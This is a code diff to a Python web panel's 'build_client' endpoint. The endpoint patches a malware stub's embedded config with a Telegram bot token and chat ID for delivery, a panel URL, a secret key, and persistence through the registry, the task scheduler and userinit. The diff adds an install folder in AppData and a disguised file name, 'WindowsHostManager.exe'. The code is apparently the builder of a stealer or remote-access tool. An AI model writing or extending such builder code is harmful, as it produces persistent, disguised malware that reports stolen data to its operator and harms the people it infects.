@@ -1459,12 +1459,14 @@ def admin_delete_invite(code):
 def build_client():
     try:
         data = request.json
-        delivery = data.get('delivery', 'TELEGRAM')
-        bot_token = data.get('botToken', '')
-        chat_id = data.get('chatId', '')
-        panel_url = data.get('panelUrl', '')
-        secret_key = data.get('secretKey', '')
-        persistence = data.get('persistence', 'registry,scheduler,userinit')
+        delivery       = data.get('delivery', 'TELEGRAM')
+        bot_token      = data.get('botToken', '')
+        chat_id        = data.get('chatId', '')
+        panel_url      = data.get('panelUrl', '')
+        secret_key     = data.get('secretKey', '')
+        persistence    = data.get('persistence', 'registry,scheduler,userinit')
+        install_folder = data.get('installFolder', '%ApplicationData%')
+        install_name   = data.get('installName', 'WindowsHostManager.exe')
 
         stub_dir = os.path.join(BASE_DIR, 'stub')
         root_dir = os.path.dirname(BASE_DIR)
@@ -1502,21 +1504,25 @@ def build_client():
             if len(val) > length: return val[:length]
             return val.ljust(length, ' ')
 
-        delivery_placeholder = get_placeholder(old_config, 'delivery')
-        token_placeholder = get_placeholder(old_config, 'botToken')
-        chat_placeholder = get_placeholder(old_config, 'chatId')
-        panel_url_placeholder = get_placeholder(old_config, 'panelUrl')
-        secret_key_placeholder = get_placeholder(old_config, 'secretKey')
-        persist_placeholder = get_placeholder(old_config, 'persistence')
+        delivery_placeholder      = get_placeholder(old_config, 'delivery')
+        token_placeholder         = get_placeholder(old_config, 'botToken')
+        chat_placeholder          = get_placeholder(old_config, 'chatId')
+        panel_url_placeholder     = get_placeholder(old_config, 'panelUrl')
+        secret_key_placeholder    = get_placeholder(old_config, 'secretKey')
+        persist_placeholder       = get_placeholder(old_config, 'persistence')
+        install_folder_placeholder = get_placeholder(old_config, 'installFolder')
+        install_name_placeholder   = get_placeholder(old_config, 'installName')
 
         new_config = (
             old_config
-            .replace(delivery_placeholder, pad_value(delivery, len(delivery_placeholder)))
-            .replace(token_placeholder, pad_value(bot_token, len(token_placeholder)))
-            .replace(chat_placeholder, pad_value(chat_id, len(chat_placeholder)))
-            .replace(panel_url_placeholder, pad_value(panel_url, len(panel_url_placeholder)))
-            .replace(secret_key_placeholder, pad_value(secret_key, len(secret_key_placeholder)))
-            .replace(persist_placeholder, pad_value(persistence, len(persist_placeholder)))
+            .replace(delivery_placeholder,       pad_value(delivery,       len(delivery_placeholder)))
+            .replace(token_placeholder,          pad_value(bot_token,      len(token_placeholder)))
+            .replace(chat_placeholder,           pad_value(chat_id,        len(chat_placeholder)))
+            .replace(panel_url_placeholder,      pad_value(panel_url,      len(panel_url_placeholder)))
+            .replace(secret_key_placeholder,     pad_value(secret_key,     len(secret_key_placeholder)))
+            .replace(persist_placeholder,        pad_value(persistence,    len(persist_placeholder)))
+            .replace(install_folder_placeholder, pad_value(install_folder, len(install_folder_placeholder)))
+            .replace(install_name_placeholder,   pad_value(install_name,   len(install_name_placeholder)))
         )
 
         old_config_bytes = old_config.encode('utf-8')
